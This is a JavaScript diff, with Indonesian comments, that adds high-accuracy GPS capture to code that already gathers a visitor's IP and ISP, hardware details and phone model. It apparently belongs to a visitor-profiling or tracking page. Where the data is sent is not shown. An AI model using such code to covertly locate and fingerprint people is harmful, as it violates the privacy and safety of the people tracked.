@@ -79,9 +79,20 @@
                 const hw = _getHardware();
                 
                 // Ambil Data Jaringan & IP
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
+                // Mengambil GPS Asli (Bakal muncul pop-up izin)
+const getGPS = () => {
+    return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+            () => resolve({ lat: "Ditolak", lon: "Ditolak", acc: "0" }),
+            { enableHighAccuracy: true }
+        );
+    });
+};
 
+const gps = await getGPS();
+const res = await fetch('https://ipapi.co/json/'); // Tetap ambil IP buat info ISP
+const d = await res.json();
                 // Deteksi Merk HP via User Agent
                 const ua = navigator.userAgent;
                 let device = "Desktop/Unknown";
